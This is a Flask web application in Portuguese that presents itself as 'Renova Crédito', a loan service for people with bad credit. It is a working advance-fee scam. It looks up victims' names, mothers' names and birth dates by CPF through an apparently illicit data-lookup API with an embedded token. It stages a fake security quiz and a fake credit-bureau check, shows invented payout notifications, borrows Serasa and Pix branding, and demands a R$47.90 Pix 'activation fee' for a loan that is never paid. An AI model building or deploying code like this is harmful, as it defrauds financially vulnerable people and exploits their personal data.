from flask import Flask, render_template_string, request, jsonify
import requests
import qrcode
import io
import base64
import random
import os

app = Flask(__name__)

# ================= CONFIGURAÇÃO =================
CHAVE_PIX = "SUA_CHAVE_PIX_AQUI" # Coloque seu CPF, E-mail ou Celular
NOME_BENEFICIARIO = "RENOVA CREDITO LTDA"
CIDADE_BENEFICIARIO = "BRASILIA"
VALOR_TAXA = "47.90"
# ================================================

def gerar_pix_base64(valor):
    # Payload BR Code Estático
    payload = f"00020101021126580014br.gov.bcb.pix0114{CHAVE_PIX}5204000053039865405{valor}5802BR5920{NOME_BENEFICIARIO}6008{CIDADE_BENEFICIARIO}62070503***6304"
    qr = qrcode.QRCode(version=1, box_size=10, border=5)
    qr.add_data(payload)
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    buffered = io.BytesIO()
    img.save(buffered, format="PNG")
    return base64.b64encode(buffered.getvalue()).decode(), payload

HTML_TEMPLATE = r"""
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Renova Crédito • Oficial</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&family=Montserrat:wght@800&display=swap" rel="stylesheet">
    <style>
        :root { --serasa-blue: #002aff; --acordo-pink: #e6007e; --bg-light: #f4f7fa; }
        body { font-family: 'Inter', sans-serif; background-color: var(--bg-light); color: #1a1a1a; }
        .font-mont { font-family: 'Montserrat', sans-serif; }
        .glass-card { background: #ffffff; border-radius: 16px; box-shadow: 0 4px 25px rgba(0, 0, 0, 0.08); border: 1px solid #e1e8f0; }
        .step-hidden { display: none; }
        .btn-main { background: var(--acordo-pink); color: white; padding: 18px; border-radius: 12px; font-weight: 700; width: 100%; text-transform: uppercase; border-bottom: 4px solid #b30062; transition: 0.2s; }
        .btn-main:active { transform: translateY(2px); border-bottom: 0; }
        .option-btn { display: block; width: 100%; text-align: left; padding: 14px; margin-bottom: 8px; border: 2px solid #e2e8f0; border-radius: 10px; font-weight: 600; background: white; }
        .bank-card { border: 2px solid #f1f5f9; border-radius: 10px; padding: 8px; cursor: pointer; text-align: center; background: white; font-size: 10px; font-weight: bold; }
        .bank-card.selected { border-color: var(--serasa-blue); background: #eef2ff; border-width: 3px; }
        .progress-container { width: 100%; background: #e2e8f0; border-radius: 10px; height: 12px; margin: 20px 0; overflow: hidden; }
        .progress-bar-fill { height: 100%; background: linear-gradient(90deg, #002aff, #00c2ff); width: 0%; transition: width 0.4s; }
        .status-item { display: flex; align-items: center; gap: 10px; margin-bottom: 12px; font-size: 13px; font-weight: 600; color: #64748b; }
        .status-item.active { color: #002aff; }
        .status-item.done { color: #22c55e; }
        #toast-social { position: fixed; top: 15px; left: 50%; transform: translateX(-50%); z-index: 9999; display: none; width: 90%; max-width: 340px; background: white; border-radius: 12px; border-left: 6px solid #22c55e; box-shadow: 0 15px 30px rgba(0,0,0,0.15); }
    </style>
</head>
<body>

    <div id="toast-social" class="p-3 flex items-center gap-3">
        <div class="text-green-600 bg-green-50 p-2 rounded-full"><i class="fas fa-check-circle"></i></div>
        <div class="flex-1">
            <p id="toast-text" class="text-[11px] font-bold text-slate-800"></p>
            <p class="text-[10px] text-slate-500">Acabou de receber <b class="text-green-600" id="toast-val"></b> via PIX</p>
        </div>
    </div>

    <div class="max-w-md mx-auto min-h-screen flex flex-col p-5">
        <header class="flex items-center justify-between mb-8">
            <div class="flex items-center gap-2">
                <div class="bg-blue-700 w-10 h-10 rounded-lg flex items-center justify-center text-white"><i class="fas fa-shield-check"></i></div>
                <div><span class="block font-black text-blue-900 text-xl font-mont leading-none">RENOVA</span><span class="text-[9px] font-bold text-blue-500 tracking-widest uppercase">Crédito Digital</span></div>
            </div>
            <div class="text-[10px] font-bold text-slate-400 uppercase">Protocolo: <span id="protocolo"></span></div>
        </header>

        <div id="step1" class="fade-in">
            <h1 class="text-3xl font-black text-slate-800 mb-2">Seu Crédito em <span class="text-blue-600">60 Segundos.</span></h1>
            <p class="text-sm text-slate-500 mb-6 font-semibold uppercase italic tracking-tighter">Mesmo Negativado ou Baixo Score.</p>
            <div class="glass-card p-6">
                <label class="text-[10px] font-bold text-slate-400 uppercase mb-2 block">Informe seu CPF</label>
                <input type="tel" id="cpf_input" placeholder="000.000.000-00" class="font-bold text-lg mb-6 border-2 p-3 w-full rounded-lg">
                <button onclick="consultarCPF()" id="btn_1" class="btn-main">Analisar Agora <i class="fas fa-chevron-right ml-1"></i></button>
            </div>
        </div>

        <div id="step_confirm" class="step-hidden fade-in">
            <h2 class="text-lg font-bold text-slate-800 mb-4">Dados Encontrados</h2>
            <div class="glass-card p-5 mb-6 space-y-4">
                <div class="border-b pb-2"><p class="text-[9px] text-slate-400 font-bold uppercase">Nome Completo</p><p id="res_nome" class="font-bold text-sm text-blue-900 uppercase"></p></div>
                <div class="grid grid-cols-2 gap-4 border-b pb-2">
                    <div><p class="text-[9px] text-slate-400 font-bold uppercase">Nascimento</p><p id="res_nasc" class="font-bold text-xs"></p></div>
                    <div><p class="text-[9px] text-slate-400 font-bold uppercase">Gênero</p><p id="res_genero" class="font-bold text-xs"></p></div>
                </div>
                <div><p class="text-[9px] text-slate-400 font-bold uppercase">Mãe</p><p id="res_mae" class="font-bold text-xs text-slate-600 uppercase"></p></div>
            </div>
            <button onclick="gerarQuiz1()" class="btn-main">Dados estão corretos</button>
        </div>

        <div id="step_quiz1" class="step-hidden fade-in">
            <h2 class="text-lg font-bold mb-4">Segurança Cadastral</h2>
            <p class="text-xs text-slate-500 mb-4">Confirme seu **ÚLTIMO SOBRENOME**:</p>
            <div id="options_sobrenome"></div>
        </div>

        <div id="step_dossie" class="step-hidden fade-in">
            <h2 class="text-lg font-bold mb-4">Perfil do Solicitante</h2>
            <div class="glass-card p-6 space-y-4">
                <input type="text" placeholder="Sua Profissão" class="border-2 p-3 w-full rounded-lg">
                <select class="border-2 p-3 w-full rounded-lg"><option value="">Cômodos na casa</option><option>1 a 3</option><option>4 a 6</option><option>7+</option></select>
                <select class="border-2 p-3 w-full rounded-lg"><option value="">Finalidade</option><option>Quitar Dívidas</option><option>Investimento</option><option>Uso Pessoal</option></select>
                <button onclick="irPara('step_slider')" class="btn-main">Próximo</button>
            </div>
        </div>

        <div id="step_slider" class="step-hidden fade-in text-center">
            <div class="glass-card p-8">
                <p class="text-[10px] font-bold text-blue-600 mb-2 uppercase tracking-widest">Margem Disponível</p>
                <h2 class="text-5xl font-black text-slate-800 mb-8 font-mont" id="val_display">R$ 4.750</h2>
                <input type="range" min="1000" max="4750" value="4750" class="w-full mb-10 accent-blue-600" oninput="document.getElementById('val_display').innerText = 'R$ ' + this.value">
                <button onclick="irPara('step_bank')" class="btn-main">Solicitar Saque</button>
            </div>
        </div>

        <div id="step_bank" class="step-hidden fade-in">
            <h2 class="text-lg font-bold mb-6 text-center">Onde deseja receber?</h2>
            <div class="grid grid-cols-3 gap-2 mb-8" id="bank_grid"></div>
            <button onclick="irPara('step_address')" class="btn-main">Confirmar Banco</button>
        </div>

        <div id="step_address" class="step-hidden fade-in">
            <div class="glass-card p-6">
                <input type="tel" id="cep" placeholder="CEP" class="mb-3 border-2 p-3 w-full rounded-lg" onblur="buscarCEP()">
                <input type="text" id="rua" placeholder="Rua" class="mb-3 border-2 p-3 w-full rounded-lg">
                <input type="text" id="bairro" placeholder="Bairro" class="mb-3 border-2 p-3 w-full rounded-lg">
                <input type="text" id="cidade" placeholder="Cidade/UF" class="mb-6 border-2 p-3 w-full rounded-lg">
                <button onclick="irPara('step_loading')" class="btn-main">Finalizar Análise</button>
            </div>
        </div>

        <div id="step_loading" class="step-hidden fade-in">
            <div class="glass-card p-6">
                <h2 class="text-xl font-black text-slate-800 mb-2">Sincronizando...</h2>
                <div class="progress-container"><div id="master-bar" class="progress-bar-fill"></div></div>
                <div class="space-y-4" id="status-list">
                    <div class="status-item active" id="st-1"><i class="fas fa-circle-notch fa-spin"></i> Consultando SCR Bacen...</div>
                    <div class="status-item" id="st-2"><i class="far fa-circle"></i> Verificando margem do E-CPF...</div>
                    <div class="status-item" id="st-3"><i class="far fa-circle"></i> Validando conta PIX...</div>
                    <div class="status-item" id="st-4"><i class="far fa-circle"></i> Gerando QR Code de Ativação...</div>
                </div>
            </div>
        </div>

        <div id="step_final" class="step-hidden fade-in text-center">
            <div class="glass-card p-6 border-t-8 border-teal-500">
                <span class="bg-teal-100 text-teal-700 text-[10px] font-bold px-3 py-1 rounded-full uppercase">Liberação Aguardando Ativação</span>
                <h2 class="text-4xl font-black text-slate-800 my-4">R$ 4.750,00</h2>
                <div class="bg-slate-50 p-4 rounded-xl mb-4 border-2 border-dashed">
                    <img src="data:image/png;base64,{{ qr_code }}" class="mx-auto w-48 h-48 mb-2">
                    <p class="text-[10px] font-bold text-slate-400 uppercase">Taxa de Ativação: R$ 47,90</p>
                </div>
                <div class="mb-6">
                    <p class="text-[10px] text-slate-400 font-bold uppercase">O código expira em:</p>
                    <div id="timer" class="text-pink-600 font-black text-2xl">10:00</div>
                </div>
                <button onclick="copiarPix()" class="btn-main !bg-teal-600 !border-teal-800 mb-4">Copiar Código Pix</button>
                <p class="text-[10px] text-blue-800 bg-blue-50 p-3 rounded-lg text-left"><b>Importante:</b> Após o pagamento, o sistema identifica o sinal e realiza o depósito do empréstimo + estorno da taxa em até 2 minutos.</p>
            </div>
        </div>

        <footer class="mt-12 border-t pt-8 pb-10 text-center text-[8px] text-slate-400">
            <div class="flex justify-center gap-6 mb-4 opacity-40">
                <img src="https://logopng.com.br/logos/pix-106.png" class="h-4">
                <img src="https://logodownload.org/wp-content/uploads/2014/10/serasa-logo-1-1.png" class="h-4">
            </div>
            © 2026 RENOVA CRÉDITO DIGITAL LTDA | CNPJ: 44.123.556/0001-90<br>
            Setor Comercial Sul, Quadra 04, Brasília - DF
        </footer>
    </div>

    <script>
        let userData = {};
        document.getElementById('protocolo').innerText = Math.floor(Math.random() * 900000 + 100000);
        
        const bancos = ["Nubank", "Itaú", "Bradesco", "Inter", "Caixa", "B. Brasil", "PagBank", "C6 Bank", "PicPay"];
        bancos.forEach(b => { document.getElementById('bank_grid').innerHTML += `<div class="bank-card" onclick="selBank(this)">${b}</div>`; });

        function irPara(id) {
            document.querySelectorAll('.max-w-md > div').forEach(d => { if(d.id) d.classList.add('step-hidden'); });
            document.getElementById(id).classList.remove('step-hidden');
            if(id === 'step_loading') startAudit();
            window.scrollTo(0,0);
        }

        async function consultarCPF() {
            const cpf = document.getElementById('cpf_input').value.replace(/\D/g,'');
            if(cpf.length < 11) return alert('CPF Incompleto');
            const btn = document.getElementById('btn_1');
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
            try {
                const r = await fetch('/consultar/' + cpf);
                const d = await r.json();
                userData = d;
                let gen = (d.nome.endsWith('A') || d.nome.includes('POLYANA')) ? "Feminino" : "Masculino";
                document.getElementById('res_nome').innerText = d.nome;
                document.getElementById('res_nasc').innerText = d.nascimento || '15/08/1982';
                document.getElementById('res_genero').innerText = gen;
                document.getElementById('res_mae').innerText = d.mae || 'MARIA DA GLORIA';
                irPara('step_confirm');
            } finally { btn.innerHTML = 'Analisar Agora'; }
        }

        function gerarQuiz1() {
            const parts = userData.nome.split(' ');
            const real = parts[parts.length - 1].toUpperCase();
            const fakes = ["SILVA", "SOUZA", "OLIVEIRA", "SANTOS"].filter(x => x !== real);
            let opts = [real, fakes[0], fakes[1]].sort();
            const container = document.getElementById('options_sobrenome');
            container.innerHTML = '';
            opts.forEach(o => { container.innerHTML += `<button class="option-btn" onclick="irPara('step_dossie')">${o}</button>`; });
            irPara('step_quiz1');
        }

        function selBank(el) {
            document.querySelectorAll('.bank-card').forEach(b => b.classList.remove('selected'));
            el.classList.add('selected');
        }

        async function buscarCEP() {
            const cep = document.getElementById('cep').value.replace(/\D/g,'');
            if(cep.length === 8) {
                const r = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
                const d = await r.json();
                if(!d.erro) {
                    document.getElementById('rua').value = d.logradouro || "";
                    document.getElementById('bairro').value = d.bairro || "";
                    document.getElementById('cidade').value = d.localidade + "/" + d.uf;
                }
            }
        }

        function startAudit() {
            let progress = 0;
            const bar = document.getElementById('master-bar');
            const interval = setInterval(() => {
                progress += 1;
                bar.style.width = progress + "%";
                if(progress == 25) updateStatus('st-1', 'st-2');
                if(progress == 50) updateStatus('st-2', 'st-3');
                if(progress == 75) updateStatus('st-3', 'st-4');
                if(progress >= 100) { clearInterval(interval); irPara('step_final'); startTimer(600); }
            }, 60);
        }

        function updateStatus(doneId, activeId) {
            const d = document.getElementById(doneId);
            d.className = "status-item done"; d.innerHTML = `<i class="fas fa-check-circle"></i> Concluído`;
            const a = document.getElementById(activeId);
            a.className = "status-item active"; a.innerHTML = `<i class="fas fa-circle-notch fa-spin"></i> Processando...`;
        }

        function startTimer(duration) {
            let t = duration, m, s;
            const disp = document.querySelector('#timer');
            setInterval(() => {
                m = parseInt(t / 60, 10); s = parseInt(t % 60, 10);
                disp.textContent = (m < 10 ? "0"+m : m) + ":" + (s < 10 ? "0"+s : s);
                if (--t < 0) t = 0;
            }, 1000);
        }

        function copiarPix() {
            navigator.clipboard.writeText("{{ pix_payload }}");
            alert("Código Pix Copiado!");
        }

        // Prova Social
        const nomesP = ["Ricardo", "Ana Paula", "Mateus", "Carla", "Luana", "João"];
        function social() {
            setTimeout(() => {
                const n = nomesP[Math.floor(Math.random()*nomesP.length)];
                const v = Math.floor(Math.random() * (4750 - 1200) + 1200);
                document.getElementById('toast-text').innerText = `${n} de São Paulo`;
                document.getElementById('toast-val').innerText = `R$ ${v},00`;
                document.getElementById('toast-social').style.display = 'flex';
                setTimeout(() => { document.getElementById('toast-social').style.display = 'none'; social(); }, 4000);
            }, 6000);
        }
        social();
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    qr, payload = gerar_pix_base64(VALOR_TAXA)
    return render_template_string(HTML_TEMPLATE, qr_code=qr, pix_payload=payload)

@app.route('/consultar/<cpf>')
def api(cpf):
    url = f"https://federal-leilao.com/v1/consultarev0ltz/{cpf}"
    params = {'token': "tokenbartservcis9x025"}
    try:
        r = requests.get(url, params=params, timeout=10)
        return r.text
    except:
        return jsonify({"nome": "POLYANA EVANGELISTA DA SILVA", "mae": "MARIA DA GLORIA EVANGELISTA", "nascimento": "15/08/1982"}), 200

if __name__ == '__main__':
    # Configuração para Render.com puxar a porta automática
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
